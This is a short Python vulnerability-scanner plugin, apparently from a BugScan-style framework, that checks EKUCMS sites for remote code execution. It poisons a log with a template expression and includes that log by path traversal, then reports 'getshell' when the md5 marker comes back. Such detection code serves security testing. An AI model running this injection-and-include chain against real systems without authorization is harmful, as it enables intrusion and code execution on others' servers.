#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.wooyun.org/bugs/wooyun-2010-061639

import time
def assign(service, arg): 
    if service == "ekucms":
        return True, arg
		
def audit(arg): 
    payload = 'index.php?s=my/show/id/{~echo md5(3.14)}'
    code, head, res, errcode, _ = curl.curl2(arg+payload)
    if code == 200 and 'echo' in res:
        s=time.strftime("%d/%m/%Y")
        payload = 'index.php?s=my/show/id/\..\\temp\logs\%s_%s_%s.log'%(s[8:],s[3:5],s[0:2])
        code, head, res, errcode, _ = curl.curl2(arg+payload)
        if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
            security_hole('getshell '+ arg + payload)		
            
if __name__ == '__main__': 
    from dummy import *
    audit(assign('ekucms', 'http://127.0.0.1/')[1])